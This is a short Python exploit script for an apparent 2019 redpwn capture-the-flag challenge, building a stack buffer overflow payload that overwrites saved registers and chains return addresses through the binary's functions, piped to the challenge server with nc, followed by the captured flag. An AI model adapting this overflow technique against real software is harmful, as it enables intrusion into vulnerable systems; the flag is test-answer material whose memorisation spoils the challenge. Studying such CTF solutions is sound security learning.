#!/usr/bin/python3

import struct
import sys

# nc chall.2019.redpwn.net 4005

#python -c 'print "A"*14 + "BBBB" + "CCCC" + "DDDD"' 
                         # ebx      ebp      eip

#python -c 'print "A"*14 + "BBBB" + "CCCC" + "\x16\x92\x04\x08" + "\x69\x95\x04\x08"' 

#0x80a0101 i_got_u
#0x08049569 call i_got_u
# 0x08049606 pop ebx; ret

"""
0x08049216    3 87           sym.air
0x0804926d    3 87           sym.water
0x080492c4    3 87           sym.land
0x0804931b    3 87           sym.underground
0x08049372    3 87           sym.limbo
0x080493c9    3 87           sym.hell
0x08049420    3 87           sym.minecraft_nether
0x08049477    3 87           sym.bedrock
0x080494ce    1 40           sym.zipline
"""

payload = b"A"*14
payload += b"BBBB" # ebx
payload += b"CCCC" # ebp
payload += struct.pack("<i", 0x08049216) # air # eip
payload += struct.pack("<i", 0x0804926d) # water
payload += struct.pack("<i", 0x080492c4) # land
payload += struct.pack("<i", 0x0804931b) # underground
payload += struct.pack("<i", 0x08049372) # limbo
payload += struct.pack("<i", 0x080493c9) # hell
payload += struct.pack("<i", 0x08049420) # minecraft_nether
payload += struct.pack("<i", 0x08049477) # bedrock
payload += struct.pack("<i", 0x08049569) # call i_got_you
payload += b"\n"

sys.stdout.buffer.write(payload)

# cat exp | nc chall.2019.redpwn.net 4005
# Ready for a ride on the zipline to hell?
# flag{h0w_l0w_c4n_u_g0_br0}
